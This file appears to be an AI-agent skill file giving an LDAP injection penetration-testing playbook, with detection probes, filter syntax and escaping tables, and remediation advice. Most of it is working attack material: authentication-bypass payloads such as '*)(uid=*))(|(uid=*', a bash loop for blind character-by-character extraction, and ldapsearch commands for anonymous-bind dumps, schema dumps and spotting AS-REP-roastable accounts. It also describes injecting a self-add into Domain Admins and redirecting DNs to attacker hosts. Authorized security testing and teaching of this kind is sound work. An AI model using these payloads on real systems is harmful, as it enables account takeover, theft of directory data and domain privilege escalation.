---
name: ldap-injection
description: LDAP injection pentest skill - detection probes, RFC 4515 filter abuse, auth bypass, blind boolean extraction, Active Directory specifics, escalation and remediation.
---

# LDAP Injection

LDAP injection arises when attacker-controlled input is concatenated into an LDAP search filter (RFC 4515) or a DN string (RFC 4514) without context-aware escaping. Because filters are fully parenthesized boolean expressions, a single unescaped `)` lets the attacker close the application's assertion and append arbitrary conditions — turning a login form, directory search, or group lookup into an oracle over the entire directory tree. This skill covers detection probes, filter syntax mechanics, authentication bypass, blind extraction, Active Directory-specific abuse, escalation paths, and hardening.

## When to use this skill

- Web/API login forms, SSO portals, or "forgot password" flows backed by LDAP bind or filter-based credential checks.
- Directory search boxes, people finders, address books, and autocomplete endpoints querying `uid`/`cn`/`mail`/`sAMAccountName`.
- Group membership checks, authorization middleware (`isMemberOf`, `memberOf` lookups), and self-service profile pages.
- Any endpoint whose error text or behavior hints at LDAP: `Bad search filter`, LDAP error 87, `javax.naming.OperationNotSupportedException`, `Operation not allowed on non-leaf`.
- Internal network recon where 389/636/3268/3269 is open (null session / anonymous bind enumeration).
- Post-exploitation on AD: userAccountControl bit hunting, nested group mapping, schema dumping.
- Code review of apps building filters via string concatenation (`"(&(" + attr + "=" + val + ")"`).

## Methodology

### 1. Detection & Fingerprinting

Assume a template like `(attr={INPUT})`. Probe with suffixes that change filter semantics:

```text
Normal:      jsmith
Probe A:     jsmith*                 -> result set WIDENS => wildcard honored (raw interpolation)
Probe B:     jsmith)(                -> LDAP error 87 / empty diff => parentheses not escaped
Probe C:     *)(objectClass=*        -> returns EVERY entry => full filter control confirmed
Probe D:     jsmith)(&(              -> error vs graceful-empty differential => operators parsed raw
Probe E:     jsmith)(|(objectClass=x -> boolean operator accepted => OR injection possible
```

| Signal | Meaning |
|---|---|
| Error 87 / `Bad search filter` / `LDAP_INVALID_SYNTAX` | raw concatenation, injection live |
| Result set == `(objectClass=*)` dump | attacker controls whole filter |
| `javax.naming.OperationNotSupportedException` | Java/JNDI backend |
| Identical response for `&`, `\|`, `!` probes | input escaped or parameterized — try DN context |
| Response only differs on `\|` (OR) | partial escaping of `\*` only |

Fuzz every parameter with the char set `* ) ( & | ! \ < > , ; " ' %00 %2a %28 %29` and diff response length/status code — Burp Intruder with a single-position sniper payload list works well.

### 2. Filter Syntax Reference (RFC 4515 / RFC 4514)

```text
(attr=value)            equality            (uid=jsmith)
&(c1)(c2)               AND                 (&(uid=a)(ou=sales))
|(c1)(c2)               OR                  (|(uid=a)(mail=a@x))
!(c)                    NOT                 (!(userAccountControl=514))
(attr=*)                presence            (mail=*)
(attr=v*) (*v) (*v*)    substring           (cn=j*)
(attr>=v) (attr<=v)     ordering            (createTimestamp>=20200101000000Z)
(attr:dn:=v)            extensible match on DN component
(attr:OID:=v)           matching-rule extensible match
```

Key AD matching-rule OIDs:

```text
1.2.840.113556.1.4.803   bitwise AND  (exact flag test)
1.2.840.113556.1.4.804   bitwise OR   (any-flag test)
1.2.840.113556.1.4.1941  transitive nested-group expansion (in-chain)
```

Escaping in **filter values** (RFC 4515 §3) — escape as `\HH` hex of UTF-8 byte:

| Char | Escape | Char | Escape |
|---|---|---|---|
| `\` | `\5c` | `(` | `\28` |
| `)` | `\29` | `*` | `\2a` |
| NUL | `\00` | byte >0x7F | per-byte `\HH` |

Escaping in **DN strings** (RFC 4514 §2.4):

| Context | Rule |
|---|---|
| leading/trailing space | `\20` (or `\ `) |
| leading `#` | `\#` |
| `, + " \ < > ;` | backslash-escape each |
| NUL | `\00` |

Consecutive top-level filters are implicitly ANDed by most servers: `(cn=a)(mail=b*)` == `(&(cn=a)(mail=b*))`. Exploit this when the app wraps input as `(attr=INPUT)` — no extra parens needed to add conditions.

### 3. Authentication Bypass

Backend templates and matching payloads:

```text
Template A: (&(uid={u})(userPassword={p}))
Template B: (&(sAMAccountName={u})(objectClass=user))   then separate bind
Template C: bind(DN = "uid={u},ou=people,dc=corp")       -> DN injection, not filter
```

| Field | Payload | Resulting filter / effect |
|---|---|---|
| user | `*` | `(&(uid=*)(userPassword=*))` — any entry matches if pwd also filtered |
| user+pwd | `*` / `*` | full wildcard auth bypass |
| user | `*)(uid=*))(|(uid=*` | `(&(uid=*)(uid=*))(\|(uid=*)(pwd=x))` — always true |
| user | `admin)(&(password=` | closes admin clause, injects nested AND to reshape logic |
| pwd  | `*` | `(&(uid=admin)(userPassword=*))` — password check nulled for known user |
| pwd  | `\|(uid=*)` | OR-injection equivalent of `' or 1=1'--` |
| user | `\|(uid=*)(&(` | forces OR branch true regardless of password clause |

For Template C (bind-based), inject RFC 4514 metacharacters into the DN: user `,ou=` rewrites the bind base; test `jsmith,ou=people,dc=corp,dc=local%00`. Bind failures are usually generic (`invalid credentials`) — enumerate valid users first via the search-side oracle.

### 4. Blind LDAP Injection

When results are not reflected, use the filter as a boolean oracle via response diffing.

```text
Template: (cn={INPUT})
Control:  admin)(givenName=ZZZ*      -> FALSE baseline
Test:     admin)(givenName=A*        -> TRUE if any entry's givenName starts with 'A'
```

Character-by-character prefix extraction:

```bash
known=""
for c in {a..z} {0..9} . _ - @; do
  p="admin)(givenName=${known}${c}*"
  # send p; if response matches TRUE-baseline length/status -> known+=$c; break
done
# repeat until no char extends; yields full attribute value one char at a time
```

- Test both TRUE and FALSE baselines each round to defeat caching and flaky diffs.
- Numeric/boolean attributes: `(adminCount=1*)`, `(lockoutTime>=0)` for yes/no oracles.
- Timing channels are weak in LDAP; if needed, force expensive scans by appending `(objectClass=*)(&(...))` to widen candidate sets and compare latency — treat as corroboration only.
### 5. Active Directory Specifics

userAccountControl bit tests via bitwise matching rule:

```text
(userAccountControl:1.2.840.113556.1.4.803:=512)      normal enabled account
(userAccountControl:1.2.840.113556.1.4.803:=514)      DISABLED account
(userAccountControl:1.2.840.113556.1.4.803:=65536)    password never expires
(userAccountControl:1.2.840.113556.1.4.803:=32)       PASSWD_NOTREQD
(userAccountControl:1.2.840.113556.1.4.803:=4194304)  DONT_REQ_PREAUTH (AS-REP roastable)
(userAccountControl:1.2.840.113556.1.4.803:=544)      enabled + no expiry composite
```

Group and identity nuances:

```text
(memberOf=CN=Helpdesk,OU=Groups,DC=corp,DC=local)                    direct membership ONLY
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,...)    nested/transitive chain
(sAMAccountName=jsmith)            legacy NetBIOS-style login name
(userPrincipalName=jsmith@corp.local)   UPN login — try both on auth endpoints
(primaryGroupId=513)               primary group fallback memberOf misses
```

Null session / anonymous bind enumeration:

```bash
ldapsearch -x -H ldap://dc.corp.local -b "dc=corp,dc=local" \
  "(objectClass=user)" sAMAccountName memberOf
# no -D/-w => anonymous bind; success = null-session exposure of directory data
ldapsearch -x -H ldap://dc.corp.local -b "" -s base namingContexts
```

Paged result abuse — bypass MaxPageSize (default 1000) to dump large trees:

```bash
ldapsearch -x -H ldap://dc.corp.local -D 'cn=svc,dc=corp' -w 'pass' \
  -E pr=1000/noprompt -b "dc=corp,dc=local" "(objectClass=user)"
```

Group-writability privesc via injected modify operations: if the app binds with a write-capable service account and interpolates input into DN/attribute of add/modify calls, inject a self-add into a privileged group's `member` attribute (`dn: CN=Domain Admins,CN=Users,... / changetype: modify / add: member / member: CN=pwned,...`). Note `memberOf` is a backlink — write to the group's forward link, not the backlink.

### 6. Escalation & Exfiltration

Attribute enumeration via wildcard prefix search on any attribute:

```text
(givenName=a*) (givenName=b*) ...          first char of every givenName
(sn=s*)(mail=m*)                           narrow per-attribute
(objectClass=user)(adminCount=1)           high-privilege accounts only
(objectClass=user)(msDS-UserDontExpirePassword>=0)
```

Schema dumping:

```bash
ldapsearch -x -H ldap://dc.corp.local -b "cn=Schema,cn=Configuration,dc=corp,dc=local" \
  "(objectClass=*)" cn lDAPDisplayName mayContain mustContain
ldapsearch -x -H ldap://dc.corp.local -b "" -s base subschemaSubentry +
```

OOB confirmation where bind errors surface: verbose bind failures sometimes echo the matched DN or referral target — inject DN redirects to attacker-controlled hosts for out-of-band callbacks; otherwise confirm exfil by correlating reflected attributes in app responses with blind oracle answers.

## Tooling

- **ldapsearch**: baseline enumeration once a valid bind exists -- `ldapsearch -LLL -x -H ldap://host -b 'dc=x,dc=local' '(objectClass=*)' '*'`.
- **Burp Intruder**: position on the filter value; payloads `*`, `)(`, `%)(`, `)(cn=`, `*)(objectClass=*`, `*)(uid=*))(|(uid=*`; matcher on response length/status delta.
- **tcpdump / Wireshark (port 389)**: read cleartext LDAP filters on the wire when TLS is absent; the `ldap` dissector reconstructs the exact server-side filter.
- **impacket / windapsearch / ldapdomaindump**: post-auth AD enumeration (users, groups, SPNs, GPOs, ACLs) once injection yields a working bind.
- **Custom boolean-oracle script**: alternate `(objectClass=*` and `)(objectClass=nonexistent` and diff response lengths to enumerate attribute values character by character.
- Search vs bind context: search contexts leak truth via result counts/content; bind contexts only return success/failure — in bind contexts build oracles from *which* DN binds successfully (inject into DN to target different entries).

## Verification & Deliverables

1. **PoC — Auth bypass**: capture the login request; replay with user field `*)(uid=*))(|(uid=*` and password `x`; document HTTP 200/authenticated session plus the reconstructed backend filter proving the bypass.
2. **PoC — Blind extraction**: log the character-by-character oracle run recovering a sensitive attribute value (e.g., service account `mail` or a hidden flag entry), including control-request pairs proving boolean determinism.
3. **PoC — AD exposure**: attach null-session/anonymous-bind output (`namingContexts`, user list), paged-result dump count exceeding MaxPageSize expectations, and userAccountControl bit-test results flagging disabled/AS-REP-roastable accounts.
4. **Impact**: full directory read = complete org chart, credential material (`userPassword`, AD hashes via DCSync-adjacent paths), privilege-group maps; auth bypass = account takeover; writable-bind injection = domain admin escalation.
5. **Remediation — escaping**: escape all interpolated values per RFC 4515 in filter context (`\5c \2a \28 \29 \00`, plus bytes >0x7F) and RFC 4514 in DN context (`\20 \# , + " \ < > ;`) — never reuse one escaper for the other context.
6. **Remediation — parameterization**: use library-provided filter builders (`Spring LdapQueryBuilder`, JNDI `SearchControls` with pre-encoded args, ldap3/ldapjs safe constructors); treat attribute names and DNs as data via allowlists, never concatenate.
7. **Remediation — validation**: allowlist attribute names against the schema; validate DNs structurally; reject or hex-encode `*()\&|!` and control chars in free-text inputs bound for filters.
8. **Remediation — server hardening**: bind accounts with least privilege (read-only on needed subtrees only), disable anonymous bind (`nsslapd-allow-anonymous-access: off`, AD anonymous R&W restrictions), enforce MaxPageSize/MaxValRange caps, restrict schema visibility via ACLs, return generic auth errors without LDAP detail.
